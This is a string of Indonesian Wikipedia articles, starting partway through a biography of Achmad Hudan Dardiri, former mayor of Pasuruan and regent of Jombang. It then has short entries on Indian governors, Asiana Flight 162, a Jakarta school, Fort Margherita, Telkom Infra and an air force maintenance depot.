Ayah kandungnya bernama Haji Achmad Dardiri, lahir tahun 1860 di Malang. Ia merupakan seorang pegawai di wilayah Regentschap Malang, dan pensiun pada tahun 1960, berpendidikan HIS, dan ikut berorganisasi di perkumpulan Nahdlatul Ulama pada tahun 1926. Sang ayahanda ini meninggal pada tahun 1978.

Jika dirunut silsilah keluarga dari garis Haji Achmad Dardiri, keluarga Hudan ini memiliki persambungan darah hingga ke Raja Majapahit. Runutan silsilahnya seperti berikut: Raja Majapahit berputra: Batara Katong. Betara Katong berputra: Sunan Drajad. Sunan Drajad berputra: Kyai Tegal Arum I. Kyai Tegal Arum I memiliki putra: Kyai Tegal Arum II. Kyai Tegal Arum II berputra: Kyai Terongrancang. Kyai Terongrancang berputra: Kyai Joyosetiko I. Kyai Joyosetiko I memiliki putra: Kyai Musahal. Lalu Kyai Musahal berputra: B.A. Marman. Kemudian B.A. Marman memiliki anak: R.A. Nap. Selanjutnya R.A. Nap berputri R.A. Napsiah. Lalu R.A. Napsiah berputra: Soekasah Sosroamijoyo. Dan Soekasah Sosroamijoyo memiliki putra Achmad Dardiri, yang kemudian memiliki putra yang pertama bersebut Achmad Hudan Dardiri.

Sementara ibu kandung Hudan bernama Siti Aminah, lahir pada tahun 1910, di Malang, di Jl. Tongan Gang I/ 287. Kemudian pindah rumah di Jl. Arief
Margono 19. Rumah yang terakhir ini merupakan rumah keluarga Hudan di mana semua kerabat dan sanak-familinya sering berkumpul dan bersilaturahmi. Sang ibu, sebagaimana sang ayah Hudan, dahulunya juga mengikuti organisasi berupa perkumpulan Muslimat NU pada tahun 1932, sebagai suatu bentuk pengayaan dan penghayatan dalam bersosial dan dalam pengembangkan keilmuan Agama Islam.

Perkawinan Haji Hudan Dardiri dengan Siti Aminah melahirkan 12 putra-putri. Dan Achmad Hudan Dardiri adalah anak pertama mereka. Lalu saudara-saudaranya secara berurutan adalah sebagai beikut:

Riwayat perjuangan Achmad Hudan Dardiri dalam membela tanah air pada masa pergolakan Perang Kemerdekaan adalah Perang Kemerdekaan, di Pulau Jawa, tahun 1945-1950, sebagai Penyelidik Militer Khusus. Perang Kemerdekaan, di Jawa Timur, tahun 1947-1948, di Markas Besar Pertempuran TCDT. Perang Kemerdekaan, di Malang dan Blitar, tahun 1947-1950, TRIP. DE17/Det I.

Sebagai pendidik ia pernah menjadi Guru Madrasah tingkat swasta, tahun 1941-1942, di Blitar, Guru SMP, tahun 1947-1950, di Blitar, Guru swasta SMA Muhammadiyah, tahun 1949-1957, di Blitar, Guru tingkat Taman Dewasa, tahun 1950-1957, di Blitar, Guru tingkat Taman Madya, tahun 1957-1966, di Malang, SMA Negeri 1 Malang (1951-1957), SMA Negeri 2 Malang (1957-1966), SMKA Malang (1952-1960), SHD Malang (1960-1966), PGSLP Malang (sebagai dosen, 1955-1966), KPAA Malang (1961-1966), IKIP Malang (sebagai dosen, 1957-1966). Guru di instansi Departemen Agama di SGAI/PGAA Malang (1953-1958), SGHI Malang (1953-1956), IAIN (sebagai dosen, 1960-1966). Guru di Departemen Kehakiman, pada instansi Kejaksaan (1953-1956), KMCA dan Dosen IAIN Malang (1960-1967). Rektor IKIP PGRI Jatim, di instansi Yayasan PGRI (1975-1985). Rektor IKIP PGRI Surabaya (1985- sekitar 1996). Pj. Rektor UNIPA Surabaya (1998-1999).

Semenjak menjabat sebagai Wali kota Pasuruan pada tahun 1969-1975, ia mengembangkan semangat toleransi dan demokrasi baik di kalangan pemerintahan
maupun kepada warga Pasuruan. Pasuruan yang merupakan daerah yang memiliki potensi budaya dan sumber alam yang luar biasa. Keberagaman masyarakatnya juga mencerminkan kerukunan yang terjalin dengan baik. Etnis tionghoa dan Arab terbilang cukup banyak. Toleransi antar etnis dan antar agama menjadi prioritas yang dicanangkan A. Hudan Dardiri, selain pengembangan dan pembangunan dalam sektor pemerintahan dan kebutuhan publik secara luas. Dalam
menjalankan tugas-tugas kenegaraan itu ia berumah dinas di kompleks balaikota Pasuruan di Jl. Balaikota No. 12, Pasuruan.

Salah satu toleransi yang dikembangkan sebagai bentuk kesadaran bagaimana memahami dan menghayati nilai-nilai Agama Islam terbukti dalam suatu peristiwa yang terjadi di Masjid Agung Pasuruan. Saat itu persiapan shalat Jumat hendak dilaksanakan. Masjid ini merupakan masjid terbesar. Pemangku dan takmir masjid kebanyakan dipegang oleh orang-orang keturunan Arab. Tradisi khutbah dengan menggunakan bahasa Arab ada di sini. Suatu hari, pada tahun 1969, Hudan melaksanakan Jumatan di Masjid ini. Ia datang lebih awal sebelum jamaah lain. Ia langsung menuju dan duduk di shaf terdepan. Tiba-tiba muncul seoarang takmir bertampang dan berperawakan Arab menemuinya dan memintanya untuk bergeser ke belakang. Si takmir itu mengatakan
bahwa shaf depan hanya untuk penggede dan syaikh-syaikh Arab saja. Hudan terkaget sejenak. Ia tertegun, namun dengan senyum santun ia mengangguk dan berbalik menuju shaf paling belakang.

Jamaah mulai banyak. Shaf-shaf mulai terisi penuh. Azan dikumandangkan. Khotib yang muncul adalah orang keturunan Arab. Berkhutbah dengan menggunakan
bahasa Arab. Tak sampai 20 menit khutbah selesai. Wiridan sebentar. Lalu salah satu takmir lain mengumumkan bahwa Wali kota Pasuruan yang baru sedang ikut bershalat Jumat di masjid tersebut dan diminta ke mimbar podium untuk memberikan semacam pidato kecil. Hudan yang sedari awal datang yang digeser duduk ke shaf paling belakang lantas maju ke depan. Dengan baju dan celana panjang yang sederhana serta berkopyah hitam ia membelah shaf para jamaah dengan merunduk permisi, penuh hati-hati dan sopan.

Di atas mimbar itu Hudan menyampaikan rasa terima kasihnya yang tak terhingga kepada seluruh masyarakat Pasuruan yang telah menerima dirinya sebagai
Wali kota. Ia mengharapkan dukungan warganya untuk membantu dalam proses pembangunan di segala bidang. Menghimbau kepada segenap masyarakat untuk tetap
menjalin kebersamaan antar pemeluk agama dan etnis. Ia menyinggung sedikit sebelum soal khutbah yang disampaikan khotib, mengucapkan wassalam dari mimbar itu. “"Apakah sedoyo jamaah Jumat mangertos nopo ingkang dipun sampaikan khotib kolo wau?"” (apakah jamaah sekalian mengerti apa yang disampaikan khatib tadi) Tanyanya kepada seluruh jamaah. Semua jamaah diam. Para penggede warga Arab terutama takmirnya juga tak angkat bicara. “"Jika semuanya jamaah mengerti khutbah dengan menggunakan bahasa Arab, ya monggo saja. Tetapi jika tidak paham, untuk apa khutbah bahasa Arab itu dijadikan khutbah rutin setiap Jumat? Maka, alangkah baiknya jika khutbah yang rutin tersebut juga diselingi dengan bahasa Jawa atau dengan bahasa Indonesia. Ini sekadar saran saya, sebagai warga Pasuruan sebagaimana panjenengan sedoyo. Semoga ada kebaikan dan manfaatnya di kemudian hari."” Begitulah Hudan menutup pidato pendeknya.

Pengusulan dirinya sebagai Bupati Jombang lewat Departeman Dalam Negeri pada 1978, diawali ketika masa itu Hudan menempati posisi sebagai anggota DPRD Tingkat I di Malang, Jawa Timur. Jadi sekitar 2 tahun setelah dia bertugas sebagai Wali kota Pasuruan. Proses pemilihan kepala daerah saat itu berupa penunjukan langsung dari pusat, yang praktiknya sering melalui pengajuan dari sejumlah pejabat penting di jajaran kepolisian maupun kemiliteran. Saat itu Hudan secara langsung ditawari oleh Pak Witarmin, Pangdam V Brawijaya, Surabaya, untuk mengemban tugas kenegaraan sebagai Bupati Jombang. Tawaran tersebut diapresiasi dengan baik dan dipersiapkan proses legitimasinya secara prosedural. Sejak itulah, terhitung mulai tahun 1978 hingga tahun 1983, A. Hudan Dardiri memimpin dan bertugas mengabdikan dirinya sebagai Bupati Jombang.

Roda pemerintahan dijalankan sebagaimana yang seharusnya dan semaksimal mungkin. Hal yang paling pokok tentunya mengacu pada terwujudnya masyarakat
Jombang yang sejahtera, agamis dan bertoleransi. Dengan visi utama mewujudkan pemerintahan yang baik, meningkatkan kualitas hidup masyarakat, membangun struktur perekonomian yang kukuh, mewujudkan pembangunan yang berkelanjutan, yaitu pembangunan yang dilaksanakan tidak semata untuk mengejar pertumbuhan, namun bagaimana pertumbuhan yang ada sekaligus dapat dirasakan secara merata hasilnya oleh semua lapisan masyarakat dengan tetap mempertimbangkan faktor alam dan lingkungan sekitarnya.

Fokus yang menjadi prioritas pembangunan yang dicanangkan dan digerakkan Hudan kala itu adalah pembangunan di wilayah infrastruktur jalan dan irigasi. Ini mengingat wilayah Jombang sebagai daerah agraris. Fokus urgensif di bidang pembangunan jalan di beberapa wilayah yang belum tergarap secara optimal mulai dia tingkatkan dengan perbaikan yang signifikan, tentu terlebih dahulu dengan melihat serta mengevaluasi persoalan-persoalan mendasar yang ada. Dalam hal pertanian, dia menitikberatkan pada sektor irigasi yang baik. Karena ini merupakan persoalan penting bagi para petani. Pada masa itu ia membuat terobosan berupa pembuatan sumur bor di daerah yang dipertimbangkan nyata-nyata kesulitan air. Pengairan yang lancar tidak semua didapat oleh para petani. Wilayah-wilayah tertentu yang menjadi ujung sentral penggarapannya adalah di daerah Kabuh, Puri Semanding, Plandaan, Sumberjo, Kebon Dalem (Bareng), Kepuh Rejo bagian selatan. Juga pembenahan dan pembuatan bendungan air di daerah Jati Banjar (Ploso) dan Talun Kidul di Kecamatan Sumobito.

Banyak penghargaan yang telah diraih Hudan di sepanjang hidupnya. Di antaranya adalah: Bintang Gerilya, Bintang Mahaputra, Bintang Melati, Dharma Bakti, Pancawarsa, dan penghargaan dari BKKBN.

Pada tahun 1950-an Achmad Hudan Dardiri berkenalan dengan seorang gadis asal Solok, Sumatra Barat, ketika ia ikut andil bergerilya pada masa Perang Kemerdekaan RI, di Blitar. Di kota kelahiran Bung Karno tersebut, kedua insan ini menjalin hubungan erat. Saat itu sang gadis, yang kemudian dikenalnya dengan nama Emma Yuliasma, yang lahir di Solok, Minangkabau, Sumatra Barat, pada 8 Juli 1925, juga bertugas dalam barisan Palang Merah Indonesia dan membantu di bagian logistik para gerilyawan. Asmara dua sejoli ini makin bertumbuh pada masa pergolakan itu. Penuh romantisme dan cita-cita luhur demi membela tanah tumpah darah, bangsa dan negara. Perkenalan sampai hubungan cinta itu akhirnya membuat mereka bersepakat untuk
menjalinnya secara lebih serius dalam sebuah pernikahan.

Selang beberapa waktu kemudian, persiapan dan saling anjangsana antar dua keluarga pun berlangsung dengan mematangkan berbagai rencana perkawinan. Maka pada 9 September 1951, mereka resmi menikah. Emma Yuliasma selanjutnya, sebagai istri, selalu mendukung perjuangan suaminya di medan tempur. Mendampingi sang suami dengan penuh kasih sayang. Mengasuh anak-anak mereka hingga dewasa. Ia kemudian menekuni profesi sebagai bidan. Kemudian masuk Organisasi Golkar dan Ikatan Bidan Indonesia pada 1957-1969.

Mertua Achmad Hudan Dardiri adalah Abdul Manan Sutan Bagindo yang lahir pada tahun 1889, dari Minangkabau. Ia adalah seorang pegawai air minum
kota di daerah Solok. Pensiun pada tahun 1954, dan meninggal pada tahun 1968. Sedangkan ibu mertuanya bernama Hajah Nuriyah, dari Minangkabau juga. Namun keduanya bercerai pada tahun 1930. Hajah Nuriyah ini meninggal pada tahun 1994.

Dari perkawinan tersebut, lahirlah putra-putri A. Hudan Dadiri dengan Emma Yuliasma. Mereka adalah: Asrul Kemal Dardiri (lahir 21 Agustus 1952), Indah Agustina (lahir 19 Agustus 1954), Aida Dani Asma (lahir 22 Februari 1956), Islana Gadis Yulidani (lahir 13 Agustus 1958), dan Amidar Nurma Winarti (lahir 4 Januari 1962), Indira Damayanti (lahir 17 Januari 1965).

Pada masa tuanya Hudan tinggal bersama keluarganya di Jl. Raya Langsep No. 49, Malang. Menjalani kehidupan bersahaja dan ikut meramaikan masjid di
lingkungan sekitar sebagai bagian dari takmir masjid. Ketika pada 1998 dia ditinggal sang istri tercinta, Emma Yuliasma, dia sungguh sangat terpukul hebat. Namun semua itu dia pasrahkan pada Yang Maha Kuasa. Anak-anak dia merasa sedih juga dan menyarankan sang Bapak untuk menikah lagi. Menikah di sini dengan maksud bukan sebagaimana manusia berumur 40-50-an yang masih bersemangat untuk membina keluarga baru dan melahirkan anak. Pura-putri dia menyarankan itu sekadar untuk sebagai pendamping masa tua. Sebagai teman ngobrol dan bertukar rasa. Hal ini dianggap juga untuk mengurangi kepikunan dan saling menjaga di saat-saat tertentu.

Tentu anak-anaknya tidak sembarang pilih. Mereka mengetahui dan memilih yang tepat untuk calon istri sang Bapak. Tersebutlah sosok Niken Mudrikah. Ia juga sudah sepuh sepantaran Hudan. Ia ajukan perempuan ini. Ternyata Hudan tidak menyangka, bahwa Niken adalah kekasihnya dahulu di Malang, namun mereka tidak bersambung hubungan. Niken menikah dengan orang lain dan memiliki beberapa putra dan cucu. Sudah lama juga Niken ditinggal suaminya. Hudan menyetujui niat baik anak-anaknya tersebut. Lalu mereka dinikahkan secara sederhana pada tahun 1999. Bu Niken mendampingi Hudan yang lahir pada 7 April 1924 ini, sampai dia wafat di Malang pada Selasa Wage, pukul 04.00 WIB, 26 Juni 2007.



</doc>
<doc id="1755298" url="https://id.wikipedia.org/wiki?curid=1755298" title="Daftar gubernur di India">
Daftar gubernur di India

Di Republik India, seorang gubernur adalah kepala konstitusional dari setiap dua puluh sembilan negara bagian. Gubernur dilantik oleh Presiden India untuk masa jabatan lima tahun, dan memegang jabatan melalui persetujuan Presiden. Gubernur adalah kepala pemerintahan negara bagian "de jure"; semua tindakan eksekutifnya diambil dalam nama gubernur. Namun, gubernur harus bertindak atas nasihat dari dewan menteri terpilih yang terbanyak, yang dikepalai oleh ketua menteri, yang memegang otoritas eksekutif "de facto" di tingkat negara bagian. Konstitusi India juga memberikan kekuasaan kepada gubernur untuk bertindah di atas diskresinya sendiri, seperti hak untuk melantik atau membubarkan kementerian, merekomendasikan pemerintahan presiden, atau memperbaharui undang-undang untuk kepentingan Presiden. Selama bertahun-tahun, akibat dari kekuasaan diskresionaris tersebut dapat membuat bangkitnya konflik antara ketua menteri terpilih dan pemerintah pusat yang dilantik gubernur.

Wilayah persatuan Andaman dan Nicobar, Delhi dan Puducherry dikepalai oleh letnan-gubernur. Sejak Delhi dan Puducherry memiliki pemerintahan sendiri dengan legislatur terpilih dan dewan menteri, peran letnan-gubernur kebanyakan hanya sekadar seremonial, mirip dengan gubernur negara bagian. Empat wilayah persatuan lainnya—Chandigarh; Dadra dan Nagar Haveli; Daman dan Diu; dan Lakshadweep—diperintah oleh seorang administrator. Tidak seperti administrator dari wilayah lainnya, yang berasal dari kader Pelayanan Administratif India, sejak 1985, Gubernur Punjab bertindak sebagai Administrator Chandigarh "ex-officio".



</doc>
<doc id="1755299" url="https://id.wikipedia.org/wiki?curid=1755299" title="Asiana Airlines Penerbangan 162">
Asiana Airlines Penerbangan 162

Asiana Airlines Penerbangan 162 (OZ162/AAR162) adalah sebuah penerbangan penumpang internasional berjarak pendek reguler dari Bandar Udara Internasional Incheon dekat Seoul, Korea Selatan, ke Bandar Udara Hiroshima di Hiroshima, Jepang. Pada14 April 2015, pesawat tersebut tergelincir di landasan pacu di Bandar Udara Hiroshima di Jepang. Ada sekitar 74 penumpang dan tujuh awak kapal Asiana Airlines nomor penerbangan 162 saat pesawat tergelincir di landasan pacu. Media Jepang melaporkan bahwa pesawat berputar 180 derajat menghadap ke arah yang salah di landasan. Akibat kecelakaan ini bandara ditutup sementara guna mengevakuasi penumpang yang terluka ke rumah sakit. Pesawat tergelincir akibat kehilangan titik pendaratan di landasan. Rekaman televisi lokal muncul untuk menunjukkan bukti pendaratan keras dan tidak ada tanda-tanda landing gear, bersama dengan gambar slide evakuasi yang dikerahkan.




</doc>
<doc id="1755304" url="https://id.wikipedia.org/wiki?curid=1755304" title="SMA Negeri 98 Jakarta">
SMA Negeri 98 Jakarta

Sekolah Menengah Atas Negeri 98 Jakarta adalah Sekolah Menengah Atas Negeri yang berada di bilangan Kalisari, Pasar Rebo, Jakarta Timur.

Berawal bernama SMA Baru Kalisari. KBM sudah dimulai sejak 19 Juli 1987 . Setahun kemudian, dengan turun nya SK ( Surat Keputusan ) diubah namanya menjadi SMAN 98 Jakarta. Keadaan sekolah yang pertama kali dipimpin oleh Drs. H. M. Ali Nuh sebagai kepala sekolah dan M. Zakir, BA sebagai wakil kepala sekolah sangat berbeda dengan sekarang. Dahulu jalan disekeliling sekolah masih tanah merah dan becek di kala hujan. Lapangan sekolah hanya padang ilalang. Tiang basket juga tidak ada, hanya ada pohon singkong di kanan kiri gedung sekolah. Pagar sekolah hanya seng bukan tembok seperti sekarang. Tidak bisa membayangkan perkembangan yang begitu pesat. sawah-sawah yang menghampar di depan gedung SMAN berubah menjadi perumahan elit dan ramai penduduk.

Saat itu gedung berlantai dua ini adalah satu-satunya gedung di jalan Jaha. Nama 'Jaha' diambil dari sebuah nama pohon Jaha yang terletak didekat pertigaan SDIT As Saadah. Proses belajar mengajarnya dibagi menjadi 2 shift, yaitu pagi untuk kelas II dan III serta kelas I disiang hari sampai menjelang maghrib. Sampai tahun ketujuh SMAN 98 masih berlantai dua yang di cor tanpa atap. Pada tahun kedelapan, barulah lantai tiga di bangun dan direnovasi pada tahun tahun berikutnya hingga masih berdiri sampai saat ini.

Kurikulum yang digunakan dalam SMA Negeri 98 Jakarta adalah Kurikulum 2013 yang mulai diterapkan sejak tahun 2013 kepada setiap siswa yang bersekolah di SMA Negeri 98 Jakarta.



</doc>
<doc id="1755306" url="https://id.wikipedia.org/wiki?curid=1755306" title="Lembaga Pengelola Dana Bergulir">
Lembaga Pengelola Dana Bergulir

Dalam rangka mengoptimalkan pengelolaan dana bergulir, Kementerian Koperasi dan UKM memiliki satuan kerja yang bernama Lembaga Pengelola Dana Bergulir Koperasi, Usaha Mikro, Kecil dan Menengah (LPDB-KUMKM) yang bertugas melaksanakan pengelolaan dana bergulir untuk pembiayaan KUMKM dan pengelolaan dana negara di bidang pengembangan ekonomi lokal, tugas LPDB-KUMKM adalah sebagai berikut :
LPDB-KUMKM dibentuk dengan Surat Keputusan Menteri Negara Koperasi dan UKM Republik Indonesia Nomor 19.4/Per/M.KUMKM/VIII/2006 tanggal 18 Agustus 2006 sebagaimana telah diubah dengan Peraturan Menteri Negara Koperasi dan UKM Republik Indonesia Nomor 11/Per/M.KUKM/VI/2008 tanggal 26 Juni 2008 tentang Organisasi dan Tata Kerja Lembaga Pengelola Dana Bergulir Koperasi dan Usaha Mikro, Kecil dan Menegah Sesuai dengan Keputusan Menteri Keuangan Nomor KEP-292/MK.5/2006 Tanggal 28 Desember 2006 LPDB-KUMKM ditetapkan sebagai instasi pemerintah yang menerapkan Pola Pengelolaan Keuangan Independen dan Terpisah, sehingga LPDB-KUMKM berhak melakukan kebijakan sesuai dengan kebutuhan. Dengan dibentuknya LPDB-KUMKM diharapkan pengelolaan dana bergulir dapat dilaksanakan dengan sebaik-baiknya untuk mencapai tujuan dan menghasilkan manfaat berkelanjutan atas dana negara yang menyasar kalangan Koperasi dan UMKM.
Dengan statusnya yang demikian, maka status pegawai di LPDB-KUMKM ada 2, yaitu PNS (Pegawai Negeri Sipil) dan P3 (Pegawai Pemerintah Professional) dengan hak dan kewajiban yang sama, dimana dengan independensi yang dimilikinya LPDB-KUMKM mampu melakukan kebijakan independen terkait remunerasi, tunjangan, dan penilaian kinerja. Jenjang Kepangkatan di LPDB-KUMKM mengikuti standar berikut ini :


</doc>
<doc id="1755307" url="https://id.wikipedia.org/wiki?curid=1755307" title="Benteng Margherita">
Benteng Margherita

Benteng Margherita adalah sebuah benteng tua yang dibangun tahun 1879 oleh Charles Brooke, Rajah of Sarawak yang berlokasi di Kuching, Sarewak, Malaysia. Benteng ini merupakan mercu tanda dan monumen penting dalam sejarah Serawak pada masa kekuasaan dinasti Brooke. Benteng yang dibangun dengan gaya kastil Inggris ini dirancang untuk melindungi Kuching dari serangan bajak laut. Ia berfungsi sebagai Museum Polisi sejak tahun 1971, setelah itu diserahkan kepada pemerintah negara bagian Serawak dan kini adalah sebuah objek wisata di Kuching.

Benteng Margherita merujuk pada nama istri tercinta Charles Brooke, yaitu Margaret Alice Lili de Windt, yang dinikahinya di Highworth, Wiltshire pada 28 Oktober 1869; yang diberi gelar "Ranee of Sarawak" dengan panggilan "Her Highness" pada saat pernikahan mereka.

Benteng ini dibangun di atas bukit yang menghadap ke Sungai Serawak dan berada di tepi utara yang berseberangan dengan pusat kota Kuching yang ketika itu sedang berkembang pesat. Benteng ini dilengkapi dengan baik untuk melindungi pusat pemerintahan itu dari serangan dari arah sungai.

Bangunan bermenara tiga tingkat ini memiliki sebuah tempat pengawas di puncaknya, sebuah lapangan yang dikelilingi oleh tembok tinggi yang bertatahkan pecahan kaca tajam untuk perlindungan, jendela kayu yang tertanam ke dinding untuk tempat menembakkan meriam. Eksekusi tawanan dilakukan di lapangan tersebut, dan berlangsung sampai masa Pendudukan Jepang selama Perang Dunia II.

Benteng Margherita terletak di seberang Sungai Serawak tak jauh dari Astana, tempat kediaman resmi Yang DiPertua Negeri Sarawak. Fort Margherita dapat dicapai melalui jalan darat, yaitu selama 15 menit dari Petra Jaya, atau melalui jalur sungai dari Pangkalan Batu yang berada di depan Main Bazaar di Kuching Waterfront. Benteng tersebut saat ini letaknya berdampingan dengan Bangunan Dewan Undangan Negeri Sarawak Baru.


</doc>
<doc id="1755308" url="https://id.wikipedia.org/wiki?curid=1755308" title="Wakil Perdana Menteri Belanda">
Wakil Perdana Menteri Belanda

Wakil Perdana Menteri Belanda adalah Deputi resmi dari Kepala Pemerintahan Belanda. Saat Perdana Menteri Belanda tidak hadir, Wakil Perdana Menteri mengambil fungsi-fungsinya, seperti mengetuai Kabinet Belanda dan Dewan Menteri Belanda. Lodewijk Asscher yang saat ini menjadi petahana-nya adalah Wakil Perdana Menteri keenam dari Partai Buruh.




</doc>
<doc id="1755312" url="https://id.wikipedia.org/wiki?curid=1755312" title="Daftar Ketua Menteri Gujarat">
Daftar Ketua Menteri Gujarat

Ketua Menteri Gujarat adalah ketua eksekutif negara bagian barat India Gujarat. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto"dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Nagaland, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Setelah negara tersebut didirikan pada 1 Mei 1960, sebagai wilayah pecahan dari distrik-distrik pemakai bahasa Gujarat di Negara Bagian Bombay, 15 orang menjabat sebagai Ketua Menteri Gujarat. Beberapa diantaranya berasal dari partai Kongres Nasional India, termasuk pemegang jabatan inaugural Jivraj Narayan Mehta. Ketua menteri yang menjabat terlama di Gujarat adalah Narendra Modi dari Partai Bharatiya Janata, yang menjabat selama dua belas setengah tahun dari 2001 sampai 2014. Setelah Modi mengundurkan diri untuk menjadi Perdana Menteri India ke-15, anggota separtainya Anandiben Patel menjadi wanita pertama yang menjabat sebagai Ketua Menteri Gujarat pada 22 Mei 2014.



</doc>
<doc id="1755318" url="https://id.wikipedia.org/wiki?curid=1755318" title="MasterChef Indonesia (musim keempat)">
MasterChef Indonesia (musim keempat)

MasterChef Indonesia Season 4 adalah kelanjutan dari acara realitas MasterChef Indonesia yang ditayangkan pada tahun 2015. Audisi mulai dilaksanakan mulai 31 Mei 2015 hingga 12 September 2015. Pada musim ini, Arnold Poernomo masih didaulat menjadi dewan juri. Namun, ada sedikit perubahan pada posisi juri. Tahun ini, Degan Septoadji, dan Rinrin Marinka tidak lagi menjadi juri, dan digantikan oleh Matteo Guerinoni.




Masterchef menyajikan dua sesi yaitu:

Tantangan Masterchef yaitu:

Dua puluh gagal babak 1 serta 2 sbb:

Sepuluh kontestan yang lolos babak 1 menjadi finalis sbb:

Dua puluh kontestan yang lolos babak 2 menjadi finalis sbb:

Daftar 30 kontestan sebagai berikut:

 .





</doc>
<doc id="1755320" url="https://id.wikipedia.org/wiki?curid=1755320" title="Telkom Infra">
Telkom Infra

Telkom Infra adalah anak usaha induk ("subholding") milik PT Telkom Indonesia (Telkom Group) yang bergerak khusus di bidang jasa infrastruktur. Dibentuk pada 23 Januari 2014, anak usaha induk ini membawahi PT Dayamitra Telekomunikasi (Mitratel), PT Telkom Akses, dan PT Graha Sarana Duta (Telkom Properti). Pembentukan Telkom Infra juga merupakan strategi penataan dan optimalisasi anak perusahaan Telkom Indonesia. Direktur utama perusahaan ini hingga pada tahun 2015 adalah Edy Irianto. Alamat perusahaan terletak di Mugi Griya Building, 5th Floor Jl. MT Haryono Kav.10 Jakarta.

Pada tahun 2014, perusahaan ini mencatatkan pendapatan sebesar Rp 513,3 miliar. Jumlah tersebut dianggap melampaui target sebesar 102%. Pendapatan tersebut paling besar diperoleh dari Mitratel dengan pendapatan sebesar Rp 3,6 triliun atau 115% yang artinya pendapatan bertumbuh sekitar 44% di bandingkan tahun 2013.


</doc>
<doc id="1755323" url="https://id.wikipedia.org/wiki?curid=1755323" title="Penentuan tempat ketiga">
Penentuan tempat ketiga

Penentuan tempat ketiga adalah pertandingan tunggal yang termasuk dalam banyak pertandingan olahraga untuk menentukan peserta atau tim penempat posisi ke-3 dan ke-4. Tim yang berkompetisi dalam penentuan tempat ke-3 biasanya merupakan 2 tim yang kalah pada babak semifinal. Banyak turnamen menggunakan penentuan tempat ke-3 untuk menentukan siapa pemenang medali perunggu.


</doc>
<doc id="1755324" url="https://id.wikipedia.org/wiki?curid=1755324" title="Stasiun Sumari">
Stasiun Sumari

Stasiun Sumari (SUR) adalah stasiun kereta api nonaktif yang berada di Tirem, Duduk Sampeyan, Gresik. Dulu dari stasiun ini terdapat jalur cabang menuju Stasiun Gresik yang bersambung hingga Stasiun Indro dan bertemu kembali dengan jalur utama di Stasiun Kandangan. Jalur menuju Sumari hingga Gresik sudah ditutup oleh Jepang tahun 1943 silam, sementara jalur relnya dicabut dan dipakai untuk pembangunan jalur KA di tempat lain.

Sejak pembangunan jalur ganda lintas utara Pulau Jawa selesai, beberapa kilometer ke arah selatan dari bekas stasiun ini terdapat gardu pengontrol sinyal blok intermediet.

 Jalur Gresik dan sekitarnya


</doc>
<doc id="1755330" url="https://id.wikipedia.org/wiki?curid=1755330" title="Hendro Djarot">
Hendro Djarot

Hendro Djarot adalah adik kandung dari Slamet Rahardjo Djarot, Eros Djarot, dan Budi Djarot. Empat bersaudara yang aktif di Sanggar Teater Populer, penginggalan Teguh Karya. Aktif di dunia film, teater, dan politik di Indonesia.


Film Kuingin Jadi Presiden

Teater Setan Dalam Bahaya

NewYork Times - Hendro Djarot person movie

</doc>
<doc id="1755556" url="https://id.wikipedia.org/wiki?curid=1755556" title="Depo Pemeliharaan 30">
Depo Pemeliharaan 30

Depo Pemeliharaan 30 atau Depohar 30 adalah satuan yang berada dibawah kendali Komando Pemeliharaan Materiil Angkatan Udara yang bermarkas di Lanud Abdulrahman Saleh, Malang, Jawa Timur. Depohar 30 memiliki tugas pokok Melaksanakan pemeliharaan tingkat berat pesawat terbang bersayap tetap (Fix Wing) dan engine, motor turbine, pemeliharaan komponen dan alat uji, kalibrasi alat ukur presisi, x-ray, serta produksi materiil.

Depohar 30 membawahi tiga satuan pemeliharaan (Sathar) yaitu: Sathar 31, Sathar 32 dan Sathar 33. Kegiatan yang dilaksanakan adalah pemeliharaan berbagai jenis pesawat TNI AU di antara nya pemeliharaan Major Servicing (servis berat) pesawat Hawk 109/209 dan pesawat Cassa C-212, pemeluharaan engine T-56 series, engine TPE 331 dan Adour MK 871 (modul 5,7 dan 9) serta pembuatan komponen untuk berbagai macam tipe pesawat TNI AU.

Di awal tahun 50-an setelah AURI menerima pelimpahan pesawat-pesawat bekas Militaire Luchtvaart (AU Belanda), dibentuk Skadron-skadron Udara untuk menampung pesawat-pesawat tersebut yang jumlahnya mencapai ratusan. Kegiatan logistik yang tadinya cukup ditangani oleh Markas Besar Angkatan Udara (MBAU) harus ditangani oleh suatu wadah yang mampu menginventarisasi, mengkoordinasi serta mengawasi aset-aset tersebut. Maka melalui surat Keputusan Menteri/panglima Angkatan Udara No. 38 Thn. 1963 dibentuklah Komando Logistik TNI AU (KOLOG). KOLOG tersebut membawahi Depot-Depot Teknik dan Materiil, salah satunya Depot Teknik 012 yang berada di Lanud Abdulrachman Saleh Malang. Dengan dikeluarkannya Surat Keputusan Menpangau No. 428 tanggal 31 Mei 1960, merupakan titik awal dimulainya Proyek Pancar Gas (PAGAS) yaitu sebuah proyek perawatan dan pemeliharaan tingkat berat terhadap engine dan air frame pesawat-pesawat MIG–15, MIG–17, IL – 28 dan IL – 14 Avia. Panitia kerja Proyek Pancar Gas diketuai oleh Mayor Udara Ir. Suratman Dharma dan Wakil ketua Kapten Udara Surjono Hardjosoebroto. Secara fisik pembangunan fasilitas pemeliharaan dimulai pada tahun 1961 dengan pembangunan "”Jet Engine Overhaul Plant”" bekerja sama dengan Polish State Trading Enterprise Polandia. Depot Teknik 012 sendiri dibentuk berdasarkan Surat Keputusan Men/Pangau No. 34 Thn. 1963 tanggal 7 Agustus 1963.

